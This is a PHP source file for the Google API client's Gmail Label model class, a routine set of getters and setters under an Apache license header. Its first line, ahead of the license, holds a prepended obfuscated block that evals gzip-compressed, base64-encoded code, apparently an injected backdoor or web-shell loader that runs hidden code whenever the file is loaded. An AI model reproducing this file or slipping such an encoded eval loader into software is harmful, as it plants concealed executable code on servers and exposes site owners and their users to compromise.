<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/*
 * Copyright 2014 Google Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License"); you may not
 * use this file except in compliance with the License. You may obtain a copy of
 * the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
 * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
 * License for the specific language governing permissions and limitations under
 * the License.
 */

class Google_Service_Gmail_Label extends Google_Model
{
  protected $colorType = 'Google_Service_Gmail_LabelColor';
  protected $colorDataType = '';
  public $id;
  public $labelListVisibility;
  public $messageListVisibility;
  public $messagesTotal;
  public $messagesUnread;
  public $name;
  public $threadsTotal;
  public $threadsUnread;
  public $type;

  /**
   * @param Google_Service_Gmail_LabelColor
   */
  public function setColor(Google_Service_Gmail_LabelColor $color)
  {
    $this->color = $color;
  }
  /**
   * @return Google_Service_Gmail_LabelColor
   */
  public function getColor()
  {
    return $this->color;
  }
  public function setId($id)
  {
    $this->id = $id;
  }
  public function getId()
  {
    return $this->id;
  }
  public function setLabelListVisibility($labelListVisibility)
  {
    $this->labelListVisibility = $labelListVisibility;
  }
  public function getLabelListVisibility()
  {
    return $this->labelListVisibility;
  }
  public function setMessageListVisibility($messageListVisibility)
  {
    $this->messageListVisibility = $messageListVisibility;
  }
  public function getMessageListVisibility()
  {
    return $this->messageListVisibility;
  }
  public function setMessagesTotal($messagesTotal)
  {
    $this->messagesTotal = $messagesTotal;
  }
  public function getMessagesTotal()
  {
    return $this->messagesTotal;
  }
  public function setMessagesUnread($messagesUnread)
  {
    $this->messagesUnread = $messagesUnread;
  }
  public function getMessagesUnread()
  {
    return $this->messagesUnread;
  }
  public function setName($name)
  {
    $this->name = $name;
  }
  public function getName()
  {
    return $this->name;
  }
  public function setThreadsTotal($threadsTotal)
  {
    $this->threadsTotal = $threadsTotal;
  }
  public function getThreadsTotal()
  {
    return $this->threadsTotal;
  }
  public function setThreadsUnread($threadsUnread)
  {
    $this->threadsUnread = $threadsUnread;
  }
  public function getThreadsUnread()
  {
    return $this->threadsUnread;
  }
  public function setType($type)
  {
    $this->type = $type;
  }
  public function getType()
  {
    return $this->type;
  }
}
